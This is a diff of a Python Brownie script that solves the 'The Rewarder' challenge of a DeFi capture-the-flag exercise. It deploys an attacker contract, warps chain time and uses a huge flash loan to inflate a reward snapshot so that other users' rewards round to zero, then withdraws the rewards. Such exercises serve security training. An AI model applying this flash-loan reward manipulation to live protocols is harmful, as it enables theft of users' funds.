@@ -5,11 +5,12 @@ from brownie import (
     TheRewarderPool,
     AccountingToken,
     RewardToken,
+    attacker5,
 )
 from brownie.network.state import Chain
 from web3 import Web3
 
-TOKENS_IN_LENDER_POOL = Web3.toWei("1000000", "ether")
+TOKENS_IN_LENDER_POOL = Web3.toWei("100000000", "ether")
 
 users = []
 
@@ -60,12 +61,29 @@ def before():
     assert reward_token.totalSupply() == Web3.toWei("100", "ether")
     assert TheRewarderPool[0].roundNumber() == 2
 
-
 def run_exploit():
     # remove pass and add exploit code here
     # attacker = accounts[5] - account to be used for exploit
     # Tip: You will need to use Chain in your solution
-    pass
+    attacker = accounts[5]
+    deployer = accounts[0]
+    reward_token = RewardToken[-1]
+    rewarder_pool = TheRewarderPool[-1]
+    liquidity_token = DamnValuableToken[-1]
+    flash_loan_pool = FlashLoanerPool[-1]
+    attacker_contract = attacker5.deploy(liquidity_token.address, rewarder_pool.address, reward_token.address, {"from": deployer})
+
+    # advance chain time by 432001 seconds (5 days and 1 second)
+    chain = Chain()
+    chain.sleep(432001)
+
+    # flashLoan of 1000000 >> it will create a snapshot with a very large balance
+    # when the other users will try to retrieve the rewards, the division will be rounded to 0
+    attacker_contract.attack(flash_loan_pool.address, Web3.toWei("100000000", "ether"), {"from": attacker})
+
+    # get the rewards to the attacker contract, then send them to the attacker EA account
+    attacker_contract.getRewards(attacker.address, {"from": attacker})
+    assert reward_token.balanceOf(attacker) > 0
 
 
 def after():
